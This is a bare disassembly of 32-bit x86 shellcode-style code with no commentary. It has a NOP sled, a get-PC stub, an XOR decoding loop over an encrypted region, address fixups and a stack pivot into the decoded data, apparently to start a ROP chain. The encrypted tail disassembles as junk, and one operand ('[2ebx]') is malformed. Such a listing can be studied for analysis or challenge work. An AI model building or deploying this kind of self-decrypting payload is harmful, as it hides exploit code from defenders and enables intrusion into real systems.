nop
   1:   90                      nop
   2:   90                      nop
   3:   90                      nop
   4:   90                      nop
   5:   90                      nop
   6:   90                      nop
   7:   90                      nop
   8:   90                      nop
   9:   90                      nop
   a:   90                      nop
   b:   90                      nop
   c:   90                      nop
   d:   90                      nop
   e:   90                      nop
   f:   90                      nop
  10:   90                      nop
  11:   90                      nop
  12:   90                      nop
  13:   90                      nop
  14:   90                      nop
  15:   90                      nop
  16:   90                      nop
  17:   90                      nop
  18:   90                      nop
  19:   90                      nop
  1a:   90                      nop
  1b:   90                      nop
  1c:   90                      nop
  1d:   90                      nop
  1e:   90                      nop
  1f:   90                      nop
  20:   e8 00 00 00 00          call   0x25
  25:   5b                      pop    ebx
  26:   83 eb 05                sub    ebx,0x5
  29:   83 eb 20                sub    ebx,0x20
  2c:   8b 7c 24 04             mov    edi,DWORD PTR [esp+0x4]
  30:   31 c9                   xor    ecx,ecx
  32:   83 c7 10                add    edi,0x10
  35:   ba 02 00 00 00          mov    edx,0x2
  3a:   33 0f                   xor    ecx,DWORD PTR [edi]
  3c:   83 c7 10                add    edi,0x10
  3f:   83 ea 01                sub    edx,0x1
  42:   75 f6                   jne    0x3a
  44:   83 ef 20                sub    edi,0x20
  47:   89 d8                   mov    eax,ebx
  49:   05 c8 00 00 00          add    eax,0xc8
  4e:   ba 32 00 00 00          mov    edx,0x32
  53:   31 08                   xor    DWORD PTR [eax],ecx
  55:   83 c0 04                add    eax,0x4
  58:   83 ea 01                sub    edx,0x1
  5b:   75 f6                   jne    0x53
  5d:   89 d8                   mov    eax,ebx
  5f:   05 2c 01 00 00          add    eax,0x12c
  64:   ba 19 00 00 00          mov    edx,0x19
  69:   01 18                   add    DWORD PTR [eax],ebx
  6b:   83 c0 04                add    eax,0x4
  6e:   83 ea 01                sub    edx,0x1
  71:   75 f6                   jne    0x69
  73:   89 d8                   mov    eax,ebx
  75:   05 2c 01 00 00          add    eax,0x12c
  7a:   89 e2                   mov    edx,esp
  7c:   8b 7c 24 04             mov    edi,DWORD PTR [esp+0x4]
  80:   8b 74 24 08             mov    esi,DWORD PTR [esp+0x8]
  84:   8b 5c 24 0c             mov    ebx,DWORD PTR [esp+0xc]
  88:   89 c4                   mov    esp,eax
  8a:   c3                      ret    
  8b:   89 d4                   mov    esp,edx
  8d:   c3                      ret    
  8e:   90                      nop
  8f:   90                      nop
  90:   90                      nop
  91:   90                      nop
  92:   90                      nop
  93:   90                      nop
  94:   90                      nop
  95:   90                      nop
  96:   90                      nop
  97:   90                      nop
  98:   90                      nop
  99:   90                      nop
  9a:   90                      nop
  9b:   90                      nop
  9c:   90                      nop
  9d:   90                      nop
  9e:   90                      nop
  9f:   90                      nop
  a0:   90                      nop
  a1:   90                      nop
  a2:   90                      nop
  a3:   90                      nop
  a4:   90                      nop
  a5:   90                      nop
  a6:   90                      nop
  a7:   90                      nop
  a8:   90                      nop
  a9:   90                      nop
  aa:   90                      nop
  ab:   90                      nop
  ac:   90                      nop
  ad:   90                      nop
  ae:   90                      nop
  af:   90                      nop
  b0:   90                      nop
  b1:   90                      nop
  b2:   90                      nop
  b3:   90                      nop
  b4:   90                      nop
  b5:   90                      nop
  b6:   90                      nop
  b7:   90                      nop
  b8:   90                      nop
  b9:   90                      nop
  ba:   90                      nop
  bb:   90                      nop
  bc:   90                      nop
  bd:   90                      nop
  be:   90                      nop
  bf:   90                      nop
  c0:   90                      nop
  c1:   90                      nop
  c2:   90                      nop
  c3:   90                      nop
  c4:   90                      nop
  c5:   90                      nop
  c6:   90                      nop
  c7:   90                      nop
  c8:   fa                      cli    
  c9:   18 33                   sbb    BYTE PTR [ebx],dh
  cb:   13 42 db                adc    eax,DWORD PTR [edx-0x25]
  ce:   b0 d3                   mov    al,0xd3
  d0:   46                      inc    esi
  d1:   db f0                   fcomi  st,st(0)
  d3:   9a b2 db b8 15 81 29    call   0x2981:0x15b8dbb2
  da:   3d d0 c1 de 37          cmp    eax,0x37dec1d0
  df:   d0 c1                   rol    cl,1
  e1:   f3 37                   repz aaa 
  e3:   d0 3c 19                sar    BYTE PTR [ecx+ebx*1],1
  e6:   f0 4b                   lock dec ebx
  e8:   81 9b df 0b 81 a0 3a    sbb    DWORD PTR [ebx-0x5f7ef421],0x1842133a
  ef:   13 42 18 
  f2:   f0 ab                   lock stos DWORD PTR es:[edi],eax
  f4:   75 0b                   jne    0x101
  f6:   30 13                   xor    BYTE PTR [ebx],dl
  f8:   81 91 eb d0 cb d3 f0    adc    DWORD PTR [ecx-0x2c342f15],0xdb8a9af0
  ff:   9a 8a db 
 102:   f2 d2 4a db             repnz ror BYTE PTR [edx-0x25],cl
 106:   02 da                   add    bl,dl
 108:   81 2b 7c 07 81 2b       sub    DWORD PTR [ebx],0x2b81077c
 10e:   7c 3b                   jl     0x14b
 110:   81 88 a3 83 d2 88 a3    or     DWORD PTR [eax-0x772d7c5d],0x88d283a3
 117:   83 d2 88 
 11a:   a3 83 d2 88 a3          mov    ds:0xa388d283,eax
 11f:   83 d2 88                adc    edx,0xffffff88
 122:   a3 83 d2 88 a3          mov    ds:0xa388d283,eax
 127:   83 d2 88                adc    edx,0xffffff88
 12a:   a3 83 44 19 33          mov    ds:0x33194483,eax
 12f:   13 4b 19                adc    ecx,DWORD PTR [ebx+0x19]
 132:   33 13                   xor    edx,DWORD PTR [ebx]
 134:   4f                      dec    edi
 135:   19 33                   sbb    DWORD PTR [ebx],esi
 137:   13 9b 18 33 13 9e       adc    ebx,DWORD PTR [ebx-0x61eccce8]
 13d:   18 33                   sbb    BYTE PTR [ebx],dh
 13f:   13 40 19                adc    eax,DWORD PTR [eax+0x19]
 142:   33 13                   xor    edx,DWORD PTR [ebx]
 144:   a2 18 33 13 a6          mov    ds:0xa6133318,al
 149:   18 33                   sbb    BYTE PTR [ebx],dh
 14b:   13 ab 18 33 13 b1       adc    ebp,DWORD PTR [ebx-0x4eeccce8]
 151:   18 33                   sbb    BYTE PTR [ebx],dh
 153:   13 c9                   adc    ecx,ecx
 155:   18 33                   sbb    BYTE PTR [ebx],dh
 157:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 15a:   33 13                   xor    edx,DWORD PTR [ebx]
 15c:   42                      inc    edx
 15d:   18 33                   sbb    BYTE PTR [ebx],dh
 15f:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 162:   33 13                   xor    edx,DWORD PTR [ebx]
 164:   42                      inc    edx
 165:   18 33                   sbb    BYTE PTR [2ebx],dh
 167:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 16a:   33 13                   xor    edx,DWORD PTR [ebx]
 16c:   42                      inc    edx
 16d:   18 33                   sbb    BYTE PTR [ebx],dh
 16f:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 172:   33 13                   xor    edx,DWORD PTR [ebx]
 174:   42                      inc    edx
 175:   18 33                   sbb    BYTE PTR [ebx],dh
 177:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 17a:   33 13                   xor    edx,DWORD PTR [ebx]
 17c:   42                      inc    edx
 17d:   18 33                   sbb    BYTE PTR [ebx],dh
 17f:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 182:   33 13                   xor    edx,DWORD PTR [ebx]
 184:   42                      inc    edx
 185:   18 33                   sbb    BYTE PTR [ebx],dh
 187:   13 42 18                adc    eax,DWORD PTR [edx+0x18]
 18a:   33 13                   xor    edx,DWORD PTR [ebx]
 18c:   42                      inc    edx
 18d:   18 33                   sbb    BYTE PTR [ebx],dh
 18f:   13                      .byte 0x13